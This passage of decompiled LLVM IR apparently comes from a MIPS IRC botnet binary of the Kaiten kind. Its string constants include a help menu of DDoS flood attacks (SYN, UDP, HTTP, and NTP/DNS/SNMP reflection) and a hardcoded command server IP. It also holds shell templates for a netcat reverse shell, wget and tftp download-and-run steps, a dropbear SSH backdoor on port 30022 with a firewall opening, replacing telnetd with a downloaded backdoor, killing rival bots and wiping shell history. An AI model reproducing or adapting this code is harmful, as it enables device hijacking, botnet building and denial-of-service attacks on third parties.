0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028c10.645, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028c1c.646, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c28.647, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10028c30.648, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10028c3c.649, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c4c.650, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c54.651, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028c5c.652, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028c68.653, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028c74.654, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028c80.655, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028c88.656, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10028c8c.657, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028c98.541, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028ca0.658, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028ca8.659, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cac.660, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cb0.661, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cb4.662, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cb8.663, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cbc.664, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cc0.665, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cc4.666, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028cc8.667, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ccc.668, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cd0.669, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cd4.670, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cd8.671, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cdc.672, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ce0.673, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ce4.674, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028ce8.675, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cec.676, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028cf0.677, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028cf4.678, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028cfc.679, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028d04.680, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028d0c.681, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d14.682, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d1c.683, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d24.684, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d2c.685, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028d34.686, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d40.687, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d48.688, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028d50.689, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028d5c.690, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028d64.691, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d6c.692, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d74.693, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d7c.694, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028d84.695, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028d8c.696, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028d94.697, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028da0.698, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028da8.699, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028db0.700, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028db8.701, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028dc0.702, i32 0, i32 0)]
@global_var_1002beb8.704 = constant [123 x i8] c"pkill -9 %s || busybox pkill -9 %s || /usr/busybox pkill -9 %s || /bin/busybox pkill -9 %s || /var/run/busybox pkill -9 %s\00"
@global_var_1000efe4.705 = constant [3 x i8] c"8`\00"
@global_var_1002bf34.706 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1002bf4c.707 = constant [29 x i8] c"cd /root;rm -f .bash_history\00"
@global_var_1002bf6c.708 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1002bf84.709 = constant [30 x i8] c"NOTICE %s :%s resolves to %s\0A\00"
@global_var_1000f138.710 = constant i32 1207959580
@global_var_1002bfa4.711 = constant [28 x i8] c"NOTICE %s :DNS2IP <domain>\0A\00"
@global_var_1000f154.712 = constant [3 x i8] c"8`\00"
@global_var_1002bfc0.713 = constant [40 x i8] c"NOTICE %s :UPDATEHTTP <host> <src:bin>\0A\00"
@global_var_1000f1e0.714 = constant [3 x i8] c"8`\00"
@global_var_1000f1e8.715 = constant [3 x i8] c"8`\00"
@global_var_1002bfe8.716 = constant [96 x i8] c"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\0A\00"
@global_var_1000f228.717 = constant [3 x i8] c"8`\00"
@global_var_1000f230.718 = constant i32 939524098
@global_var_1000f2b4.719 = constant [3 x i8] c"8`\00"
@global_var_1000f2bc.720 = constant [3 x i8] c"9?\00"
@global_var_1000f2ec.721 = constant i32 1207959564
@global_var_1000f348.722 = constant [3 x i8] c"8`\00"
@global_var_1002c048.723 = constant [11 x i8] c"gcc --help\00"
@global_var_1002c054.724 = constant [6 x i8] c"Usage\00"
@global_var_1000f3dc.725 = constant i32 1207959564
@global_var_1002c05c.726 = constant [30 x i8] c"NOTICE %s :Receiving update.\0A\00"
@global_var_1002c07c.727 = constant [11 x i8] c"mkdir /tmp\00"
@global_var_1002c088.728 = constant [8 x i8] c"/tmp/.c\00"
@global_var_1000f634.729 = constant i32 1207959588
@global_var_1000f770.730 = constant i32 1207959588
@global_var_1002c090.731 = constant [70 x i8] c"(gcc -o %s /tmp/.c; rm -f /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1\00"
@global_var_1004dc84.732 = global i32 0
@global_var_1000f7fc.733 = constant i32 1207960312
@global_var_1002c0d8.734 = constant [8 x i8] c"/tmp/.o\00"
@global_var_1000f934.735 = constant i32 1207959588
@global_var_1000fa70.736 = constant i32 1207959588
@global_var_1002c0e0.737 = constant [188 x i8] c"export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap  1;/tmp/.o '&\00"
@global_var_1000fb10.738 = constant [3 x i8] c"8`\00"
@global_var_1000fb1c.739 = constant [3 x i8] c"8`\00"
@global_var_1002c19c.740 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_1000fb88.741 = constant [3 x i8] c"8`\00"
@global_var_100451b0.742 = local_unnamed_addr global i32 0
@global_var_1004516c.743 = local_unnamed_addr global i32 0
@global_var_1002c1b8.744 = constant [9 x i8] c"/var/bin\00"
@global_var_1002c1c4.745 = constant [40 x i8] c"NOTICE %s :HACKPGK <url> <binary name>\0A\00"
@global_var_1000fc50.746 = constant [3 x i8] c"8`\00"
@global_var_1000fc58.747 = constant [3 x i8] c"8`\00"
@global_var_1000fc98.748 = constant [3 x i8] c"8`\00"
@global_var_1000fcec.749 = constant i32 1207959584
@global_var_1000fd0c.750 = constant i32 939524096
@global_var_1000fde4.751 = constant [3 x i8] c"8`\00"
@global_var_1000fdec.752 = constant [3 x i8] c"9?\00"
@global_var_1000fe1c.753 = constant i32 1207959564
@global_var_1000fe78.754 = constant [3 x i8] c"8`\00"
@global_var_1002c1ec.755 = constant [277 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_10010004.756 = constant i32 1207959588
@global_var_1002c304.757 = constant [39 x i8] c"NOTICE %s :Installed %s to hack path.\0A\00"
@global_var_10010168.758 = constant i32 1207959588
@global_var_1002c32c.759 = constant [21 x i8] c"cat %s > /var/bin/%s\00"
@global_var_1002c344.760 = constant [9 x i8] c"rm -f %s\00"
@global_var_1002c350.761 = constant [22 x i8] c"chmod 775 /var/bin/%s\00"
@global_var_1002c368.762 = constant [18 x i8] c"ls -l /var/bin/%s\00"
@global_var_1001029c.763 = constant [3 x i8] c"8`\00"
@global_var_1002c37c.764 = constant [55 x i8] c"NOTICE %s :Non-root/non-spoof DDoS commands commands:\0A\00"
@global_var_10010310.765 = constant [3 x i8] c"8`\00"
@global_var_1002c3b4.766 = constant [69 x i8] c"NOTICE %s :    STD <host> <port> <time> = A non spoofed STD flooder\0A\00"
@global_var_10010330.767 = constant [3 x i8] c"8`\00"
@global_var_1002c3fc.768 = constant [84 x i8] c"NOTICE %s :    OVH <host> <port> <throttle> <time> = A non spoofed UDP OVH flooder\0A\00"
@global_var_10010350.769 = constant [3 x i8] c"8`\00"
@global_var_1002c450.770 = constant [84 x i8] c"NOTICE %s :    vTCP <ip> <port> <time> = A non spoofed Randomizer TCP flooder Flag\0A\00"
@global_var_10010370.771 = constant [3 x i8] c"8`\00"
@global_var_1002c4a4.772 = constant [74 x i8] c"NOTICE %s :    HOLD <host> <port> <time> = A vanilla TCP connect flooder\0A\00"
@global_var_10010390.773 = constant [3 x i8] c"8`\00"
@global_var_1002c4f0.774 = constant [75 x i8] c"NOTICE %s :    JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\0A\00"
@global_var_100103b0.775 = constant [3 x i8] c"8`\00"
@global_var_1002c53c.776 = constant [143 x i8] c"NOTICE %s :    UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Freak\0A\00"
@global_var_100103d0.777 = constant [3 x i8] c"8`\00"
@global_var_1002c5cc.778 = constant [105 x i8] c"NOTICE %s :    HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\0A\00"
@global_var_100103f0.779 = constant [3 x i8] c"8`\00"
@global_var_1002c638.780 = constant [60 x i8] c"NOTICE %s :    WGETFLOOD <url> <secs> = An HTTP(S) flooder\0A\00"
@global_var_10010410.781 = constant [3 x i8] c"8`\00"
@global_var_1002c674.782 = constant [33 x i8] c"NOTICE %s :Spoof/root commands:\0A\00"
@global_var_10010430.783 = constant [3 x i8] c"8`\00"
@global_var_1002c698.784 = constant [59 x i8] c"NOTICE %s :    UDP <target> <port> <secs> = A UDP flooder\0A\00"
@global_var_10010450.785 = constant [3 x i8] c"8`\00"
@global_var_1002c6d4.786 = constant [124 x i8] c"NOTICE %s :    VSET <method> <target> <thread> <time> = Valve Source Engine Flood, using the TQuery Engine Source EXPLOIT.\0A\00"
@global_var_10010470.787 = constant [3 x i8] c"8`\00"
@global_var_1002c750.788 = constant [105 x i8] c"NOTICE %s :    PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_10010490.789 = constant [3 x i8] c"8`\00"
@global_var_1002c7bc.790 = constant [166 x i8] c"NOTICE %s :    TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\0A\00"
@global_var_100104b0.791 = constant [3 x i8] c"8`\00"
@global_var_1002c864.792 = constant [95 x i8] c"NOTICE %s :    GIGATCP Flooding <target> <flags/method> <secs> = Advanced Spoofed TCP Flooder\0A\00"
@global_var_100104d0.793 = constant [3 x i8] c"8`\00"
@global_var_1002c8c4.794 = constant [141 x i8] c"NOTICE %s :    BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU. USE EXTREME CARE\0A\00"
@global_var_100104f0.795 = constant [3 x i8] c"8`\00"
@global_var_1002c954.796 = constant [85 x i8] c"NOTICE %s :    SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\0A\00"
@global_var_10010510.797 = constant [3 x i8] c"8`\00"
@global_var_1002c9ac.798 = constant [152 x i8] c"NOTICE %s :    NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\0A\00"
@global_var_10010530.799 = constant [3 x i8] c"8`\00"
@global_var_1002ca44.800 = constant [114 x i8] c"NOTICE %s :    DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\0A\00"
@global_var_10010550.801 = constant [3 x i8] c"8`\00"
@global_var_1002cab8.802 = constant [159 x i8] c"NOTICE %s :    SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\0A\00"
@global_var_10010570.803 = constant [3 x i8] c"8`\00"
@global_var_1002cb58.804 = constant [28 x i8] c"NOTICE %s :Other commands:\0A\00"
@global_var_10010590.805 = constant [3 x i8] c"8`\00"
@global_var_1002cb74.806 = constant [54 x i8] c"NOTICE %s :    RNDNICK = Randomizes the knights nick\0A\00"
@global_var_100105b0.807 = constant [3 x i8] c"8`\00"
@global_var_1002cbac.808 = constant [61 x i8] c"NOTICE %s :    NICK <nick> = Changes the nick of the client\0A\00"
@global_var_100105d0.809 = constant [3 x i8] c"8`\00"
@global_var_1002cbec.810 = constant [50 x i8] c"NOTICE %s :    SERVER <server> = Changes servers\0A\00"
@global_var_100105f0.811 = constant [3 x i8] c"8`\00"
@global_var_1002cc20.812 = constant [54 x i8] c"NOTICE %s :    GETSPOOFS = Gets the current spoofing\0A\00"
@global_var_10010610.813 = constant [3 x i8] c"8`\00"
@global_var_1002cc58.814 = constant [63 x i8] c"NOTICE %s :    SPOOFS <subnet> = Changes spoofing to a subnet\0A\00"
@global_var_10010630.815 = constant [3 x i8] c"8`\00"
@global_var_1002cc98.816 = constant [66 x i8] c"NOTICE %s :    DISABLE = Disables all packeting from this client\0A\00"
@global_var_10010650.817 = constant [3 x i8] c"8`\00"
@global_var_1002ccdc.818 = constant [64 x i8] c"NOTICE %s :    ENABLE = Enables all packeting from this client\0A\00"
@global_var_10010670.819 = constant [3 x i8] c"8`\00"
@global_var_1002cd1c.820 = constant [40 x i8] c"NOTICE %s :    KILL = Kills the knight\0A\00"
@global_var_10010690.821 = constant [3 x i8] c"8`\00"
@global_var_1002cd44.822 = constant [32 x i8] c"NOTICE %s :    DNS2IP <domain>\0A\00"
@global_var_100106b0.823 = constant [3 x i8] c"8`\00"
@global_var_1002cd64.824 = constant [101 x i8] c"NOTICE %s :    GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\0A\00"
@global_var_100106d0.825 = constant [3 x i8] c"8`\00"
@global_var_1002cdcc.826 = constant [66 x i8] c"NOTICE %s :    UPDATE <http address> <src:bin> = Update this bot\0A\00"
@global_var_100106f0.827 = constant [3 x i8] c"8`\00"
@global_var_1002ce10.828 = constant [108 x i8] c"NOTICE %s :    HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\0A\00"
@global_var_10010710.829 = constant [3 x i8] c"8`\00"
@global_var_1002ce7c.830 = constant [53 x i8] c"NOTICE %s :    VERSION = Requests version of client\0A\00"
@global_var_10010730.831 = constant [3 x i8] c"8`\00"
@global_var_1002ceb4.832 = constant [54 x i8] c"NOTICE %s :    KILLALL = Kills all current packeting\0A\00"
@global_var_10010750.833 = constant [3 x i8] c"8`\00"
@global_var_1002ceec.834 = constant [37 x i8] c"NOTICE %s :    HELP = Displays this\0A\00"
@global_var_10010770.835 = constant [3 x i8] c"8`\00"
@global_var_1002cf14.836 = constant [65 x i8] c"NOTICE %s :    IRC <command> = Sends this command to the server\0A\00"
@global_var_10010790.837 = constant [3 x i8] c"8`\00"
@global_var_1002cf58.838 = constant [50 x i8] c"NOTICE %s :    SH <command> = Executes a command\0A\00"
@global_var_100107b0.839 = constant [3 x i8] c"8`\00"
@global_var_1002cf8c.840 = constant [66 x i8] c"NOTICE %s :    ISH <command> = SH, interactive, sends to channel\0A\00"
@global_var_100107d0.841 = constant [3 x i8] c"8`\00"
@global_var_1002cfd0.842 = constant [69 x i8] c"NOTICE %s :    SHD <command> = Executes a psuedo-daemonized command\0A\00"
@global_var_100107f0.843 = constant [3 x i8] c"8`\00"
@global_var_1002d018.844 = constant [59 x i8] c"NOTICE %s :    GETBB <tftp server> = Get a proper busybox\0A\00"
@global_var_10010810.845 = constant [3 x i8] c"8`\00"
@global_var_1002d054.846 = constant [92 x i8] c"NOTICE %s :    INSTALL  <http server/file_name> = Download & install a binary to /var/bin \0A\00"
@global_var_10010830.847 = constant [3 x i8] c"8`\00"
@global_var_1002d0b0.848 = constant [59 x i8] c"NOTICE %s :    BASH <cmd> = Execute commands using bash. \0A\00"
@global_var_10010850.849 = constant [3 x i8] c"8`\00"
@global_var_1002d0ec.850 = constant [88 x i8] c"NOTICE %s :    BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \0A\00"
@global_var_10010870.851 = constant [3 x i8] c"8`\00"
@global_var_1002d144.852 = constant [93 x i8] c"NOTICE %s :    SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \0A\00"
@global_var_10010890.853 = constant [3 x i8] c"8`\00"
@global_var_1002d1a4.854 = constant [80 x i8] c"NOTICE %s :    RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\0A\00"
@global_var_100108b0.855 = constant [3 x i8] c"8`\00"
@global_var_1002d1f4.856 = constant [102 x i8] c"NOTICE %s :    LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\0A\00"
@global_var_100108d0.857 = constant [3 x i8] c"8`\00"
@global_var_1002d25c.858 = constant [111 x i8] c"NOTICE %s :    GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\0A\00"
@global_var_100108f0.859 = constant [3 x i8] c"8`\00"
@global_var_100108f8.860 = constant [3 x i8] c"8`\00"
@global_var_1002d2cc.861 = constant [28 x i8] c"NOTICE %s :Killing pid %d.\0A\00"
@global_var_100451a0.862 = local_unnamed_addr global i32 0
@global_var_1002d2e8.863 = constant [21 x i8] c"kill -9 %d;kill -9 0\00"
@global_var_10010ac4.864 = constant [3 x i8] c"8`\00"
@global_var_1002d300.865 = constant [5 x i8] c"%s%s\00"
@global_var_1002d308.866 = constant i32 553648128
@global_var_1002d30c.867 = constant [29 x i8] c"NOTICE %s :History cleared!\0A\00"
@global_var_100450c4.868 = local_unnamed_addr global i32 2
@global_var_10028908.869 = constant [12 x i8] c"Kuze-senpai\00"
@global_var_10028914.870 = constant [9 x i8] c"Morpheus\00"
@global_var_100450c8.871 = global [2 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10028908.869, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028914.870, i32 0, i32 0)]
@global_var_10010dfc.872 = constant i32 939524096
@global_var_1002d44c.873 = constant [5 x i8] c"IRC \00"
@global_var_10010ef8.874 = constant i32 1207959588
@global_var_1002d454.875 = constant [4 x i8] c"%s\0A\00"
@global_var_1002d458.876 = constant [4 x i8] c"SH \00"
@global_var_1002d45c.877 = constant [69 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s\00"
@global_var_1002d4a4.878 = constant [15 x i8] c"NOTICE %s :%s\0A\00"
@global_var_10010ff0.879 = constant [3 x i8] c"8`\00"
@global_var_10011014.880 = constant [3 x i8] c"8`\00"
@global_var_1002d4b4.881 = constant [5 x i8] c"SHD \00"
@global_var_1002d4bc.882 = constant [100 x i8] c"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&\00"
@global_var_100110f0.883 = constant [3 x i8] c"8`\00"
@global_var_10011114.884 = constant [3 x i8] c"8`\00"
@global_var_1002d520.885 = constant [7 x i8] c"GETBB \00"
@global_var_1002d528.886 = constant [330 x i8] c"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\22$fileGet\22 ] || [ ! -s /var/\22$fileGet\22 ]) && tftp -g -r \22$fileGet\22 %s && chmod +x \22$fileGet\22 && ./\22$fileGet\22 mkdir bin && ./\22$fileGet\22 --install -s /var/bin && ls -l \22$fileGet\22 || echo It appears we already have /var/\22$fileGet\22)\00"
@global_var_100111f0.887 = constant [3 x i8] c"8`\00"
@global_var_10011214.888 = constant [3 x i8] c"8`\00"
@global_var_1002d674.889 = constant [8 x i8] c"GETSSH \00"
@global_var_1002d67c.890 = constant [668 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo \22$url\22 | sed 's#.*/##'` && wget -O \22$name\22 \22$url\22;chmod +x \22$name\22;mv \22$name\22 /var/bin;ls -l /var/bin/\22$name\22 && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT\00"
@global_var_100112f0.891 = constant [3 x i8] c"8`\00"
@global_var_10011314.892 = constant [3 x i8] c"8`\00"
@global_var_1002d918.893 = constant [9 x i8] c"INSTALL \00"
@global_var_1002d924.894 = constant [389 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo \22$name either doesnt exist or eq 0 so we get\22 && cd /tmp && wget -O \22$name\22 \22$url\22 && chmod +x \22$name\22 && mv \22$name\22 /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22It appears I already have $name\22)\00"
@global_var_100113f0.895 = constant [3 x i8] c"8`\00"
@global_var_10011414.896 = constant [3 x i8] c"8`\00"
@global_var_1002daac.897 = constant [11 x i8] c"BINUPDATE \00"
@global_var_1002dab8.898 = constant [371 x i8] c"export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo \22$url\22 | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo \22$name doesnt exist, perhaps you mean INSTALL?\22\00"
@global_var_100114f0.899 = constant [3 x i8] c"8`\00"
@global_var_10011514.900 = constant [3 x i8] c"8`\00"
@global_var_1002dc2c.901 = constant [8 x i8] c"LOCKUP \00"
@global_var_1002dc34.902 = constant [235 x i8] c"export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)\00"
@global_var_100115f0.903 = constant [3 x i8] c"8`\00"
@global_var_10011614.904 = constant [3 x i8] c"8`\00"
@global_var_1002dd20.905 = constant [8 x i8] c"RSHELL \00"
@global_var_1002dd28.906 = constant [114 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&\00"
@global_var_100116f0.907 = constant [3 x i8] c"8`\00"
@global_var_10011714.908 = constant [3 x i8] c"8`\00"
@global_var_1002dd9c.909 = constant [6 x i8] c"SCAN \00"
@global_var_1002dda4.910 = constant [406 x i8] c"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \22I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/\5Cserver/nmap and INSTALL http://server/scan first...\22 && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)\00"
@global_var_100117f0.911 = constant [3 x i8] c"8`\00"
@global_var_10011814.912 = constant [3 x i8] c"8`\00"
@global_var_1002df3c.913 = constant [6 x i8] c"BASH \00"
@global_var_1002df44.914 = constant [98 x i8] c"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s\00"
@global_var_100118f0.915 = constant [3 x i8] c"8`\00"
@global_var_10011914.916 = constant [3 x i8] c"8`\00"
@global_var_1002d32c.917 = constant [4 x i8] c"STD\00"
@global_var_1004075c.918 = global [4 x i8]* @global_var_1002d32c.917
@global_var_10011bfc.919 = constant i32 939524097
@global_var_1002dfa8.920 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_100451bc.921 = local_unnamed_addr global i32 0
@global_var_1002dfb8.922 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1002dfc8.923 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1002dfd0.924 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1002dfdc.925 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10012054.926 = constant i32 1207959720
@global_var_10012148.930 = constant [3 x i8] c"8`\00"
@global_var_10012270.931 = constant [3 x i8] c"8`\00"
@global_var_100450b8.932 = local_unnamed_addr global i32 1
@global_var_100288f8.933 = constant [14 x i8] c"89.46.222.250\00"
@global_var_100450bc.934 = global [14 x i8]* @global_var_100288f8.933
@global_var_10012460.935 = constant i32 1207959580
@global_var_100124b8.936 = constant [3 x i8] c"8`\00"
@global_var_10012578.937 = constant i32 1207959668
@global_var_100125ac.938 = constant [3 x i8] c"8`\00"
@global_var_10012638.939 = constant i32 939524096
@global_var_1001273c.940 = constant [3 x i8] c"8`\00"
@global_var_10012788.941 = constant [3 x i8] c"8`\00"
@global_var_10012794.942 = constant i32 1207961725
@global_var_10012888.952 = constant [3 x i8] c"8`\00"
@global_var_100451a8.953 = local_unnamed_addr global i32 0
@global_var_1002e070.954 = constant [7 x i8] c"#owari\00"
@global_var_1002e078.955 = constant i32 0
@global_var_1002e07c.956 = constant [48 x i8] c"NICK [%s|%s]%s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_1001297c.957 = constant i32 1207959556
@global_var_1002e0ac.958 = constant i32 167772160
@global_var_10012d64.959 = constant i32 1207959568
@global_var_10012e0c.960 = constant i32 939524096
@global_var_1002e03c.961 = constant [4 x i8] c"352\00"
@global_var_1004088c.962 = global [4 x i8]* @global_var_1002e03c.961
@global_var_1002e0b0.963 = constant [6 x i8] c"ERROR\00"
@global_var_10012f20.964 = constant [3 x i8] c"8`\00"
@global_var_100496d4.965 = global i32 0
@global_var_100451d0.966 = global i32 0
@global_var_100451d4.967 = global i32 0
@global_var_100451d8.968 = global i32 0
@global_var_10013054.969 = constant i32 1207974477
@global_var_1004ee40.970 = global i32 0
@global_var_1004da34.971 = global i32 0
@global_var_10013078.972 = constant i32 1207982877
